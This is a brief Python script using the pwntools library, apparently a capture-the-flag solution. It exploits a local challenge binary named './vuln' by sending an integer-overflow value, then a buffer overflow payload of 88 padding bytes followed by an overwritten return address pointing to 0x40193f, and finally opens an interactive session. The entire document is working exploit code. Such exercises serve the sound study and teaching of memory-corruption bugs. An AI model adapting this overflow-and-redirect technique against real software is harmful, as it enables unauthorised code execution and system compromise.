#!/usr/bin/python

from pwn import *

trash = cyclic(88)
win = p64(0x40193f)
payload = trash + win

p = process("./vuln")

p.sendline(b"2147483648")
p.sendline(b"2")
p.sendline(payload)

p.interactive()
